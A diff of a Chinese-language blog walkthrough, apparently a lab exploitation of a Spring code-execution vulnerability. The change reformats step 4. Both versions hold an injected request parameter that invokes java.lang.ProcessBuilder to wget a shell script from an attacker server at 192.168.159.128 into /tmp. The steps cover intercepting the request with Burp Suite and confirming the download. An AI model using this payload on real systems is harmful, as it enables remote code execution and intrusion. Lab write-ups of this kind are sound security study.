@@ -165,7 +165,11 @@ tag: 代码执行漏洞
 3. 进入借书页面，随意写入16位Credit Card id和Credit Card Name点击Process按钮
 
 ![Spring]({{ '/styles/images/Spring/24.png' | prepend: site.baseurl  }})
-4. 在点击Confirm按钮前我们需要进行burpsuite进行拦截抓包，截获数据包send to repeater，篡改数据包添加恶意payload：`&_(new+java.lang.ProcessBuilder("/usr/bin/wget","-P/tmp","http://192.168.159.128/shell.sh")).start()=feifei`，shell.sh放在可以访问的服务器中，执行请求包。
+4. 在点击Confirm按钮前我们需要进行burpsuite进行拦截抓包，截获数据包send to repeater，篡改数据包添加恶意payload：
+
+		&_(new+java.lang.ProcessBuilder("/usr/bin/wget","-P/tmp","http://192.168.159.128/shell.sh")).start()=feifei
+
+	shell.sh放在可以访问的服务器中，执行请求包。
 
 ![Spring]({{ '/styles/images/Spring/1.png' | prepend: site.baseurl  }})
 5. 查看自己虚拟机的/tmp目录下有没有成功下shell.sh,可以看到shell.sh成功下载
